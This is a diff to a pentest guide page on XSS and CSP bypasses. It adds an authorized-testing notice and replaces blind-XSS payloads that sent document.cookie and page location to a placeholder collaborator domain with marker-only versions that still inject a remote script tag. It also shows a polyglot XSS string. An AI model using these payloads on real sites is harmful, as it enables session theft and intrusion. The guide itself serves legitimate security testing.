@@ -11,6 +11,9 @@ tags:
 
 # XSS, DOM, postMessage & CSP Bypasses
 
+!!! note "What this page is doing"
+    Client-side testing starts by tracing data from source to sink and identifying the browser context. Prove execution with a harmless marker in an authorized environment, preserve the policy and origin evidence, and avoid collecting cookies or personal data.
+
 ---
 
 ## 1. Context-Aware XSS Payloads
@@ -44,19 +47,20 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</
 
 Blind XSS fires in **admin dashboards, support ticket panels, log viewers, and CRM tools** — often the highest-impact XSS class because it hits privileged users.
 
-```bash
-# 1. Fire a payload at every user-input field
-"><script src=https://<COLLABORATOR_DOMAIN>/xss.js></script>
-'"><img src=x onerror=fetch('https://<COLLABORATOR_DOMAIN>/xss?c='+document.cookie)>
-"><script>new Image().src='https://<COLLABORATOR_DOMAIN>/x?u='+encodeURIComponent(location)+'&c='+document.cookie</script>
-# 2. High-yield blind XSS fields (fill these EVERYWHERE)
-# - Contact Us / Support forms (name, message, subject, company, phone, website)
-# - User-Agent, Referer, X-Forwarded-For headers (logged and rendered in panels)
-# - File names, EXIF metadata, User profile fields (first/last/company/address)
-# - Order notes, review comments, coupon codes, invite messages
-# - Error messages / stack traces (force a 500 and inject into the URL path!)
-# 3. Automated blind XSS hunting with XSS Hunter / ezXSS
-# Host your own ezXSS instance, then integrate payloads into your fuzzing wordlists.
+```text
+# Use a harmless callback marker owned by the assessment team. Do not collect
+# cookies, tokens or page contents in a blind-XSS proof.
+"><script src="https://<COLLABORATOR_DOMAIN>/xss.js"></script>
+"><img src=x onerror="fetch('https://<COLLABORATOR_DOMAIN>/xss?marker=1')">
+
+# High-yield locations to review one at a time:
+# - support fields, profile fields, order notes and invite messages
+# - User-Agent, Referer and approved forwarding headers rendered in dashboards
+# - filenames and EXIF metadata rendered by an internal viewer
+# - error messages or stack traces rendered by an approved admin panel
+
+# Host the callback endpoint under the assessment team's control and record
+# only the timestamp, user agent and a non-sensitive marker.
 ```
 
 ---
